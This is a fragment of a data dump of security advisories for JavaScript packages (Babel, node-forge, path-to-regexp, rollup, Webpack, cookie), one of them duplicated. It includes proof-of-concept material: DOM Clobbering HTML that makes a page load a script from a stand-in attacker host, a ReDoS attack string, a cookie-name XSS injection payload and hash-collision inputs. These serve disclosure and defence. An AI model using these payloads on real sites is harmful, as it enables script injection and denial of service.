      "details": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

      "details": "### Summary\n\nCVE-2025-12816 has been reserved by CERT/CC\n\n**Description**\nAn Interpretation Conflict (CWE-436) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures to desynchronize schema validations, yielding a semantic divergence that may bypass downstream cryptographic verifications and security decisions.\n\n\n### Details\n\nA critical ASN.1 validation bypass vulnerability exists in the node-forge asn1.validate function within `forge/lib/asn1.js`. ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.",

      "details": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",

      "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",

      "summary": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
      "details": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)",

      "summary": "Webpack's AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS",
      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript)\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n// entry.js\nimport('./import1.js')\n  .then(module => {\n    module.hello();\n  })\n  .catch(err => {\n    console.error('Failed to load module', err);\n  });\n```\n\n```\n// import1.js\nexport function hello () {\n  console.log('Hello');\n}\n```\n\nThe webpack.config.js is set up as follows:\n```\nconst path = require('path');\n\nmodule.exports = {\n  entry: './entry.js', // Ensure the correct path to your entry file\n  output: {\n    filename: 'webpack-gadgets.bundle.js', // Output bundle file\n    path: path.resolve(__dirname, 'dist'), // Output directory\n    publicPath: \"auto\", // Or leave this field not set\n  },\n  target: 'web',\n  mode: 'development',\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Webpack Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script src=\"./dist/webpack-gadgets.bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",

When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).\n\nIf the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).\n\nIf the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files.\n\n### Recommendation\nThe URL should be unescaped and normalized before any further processing.",

      "details": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
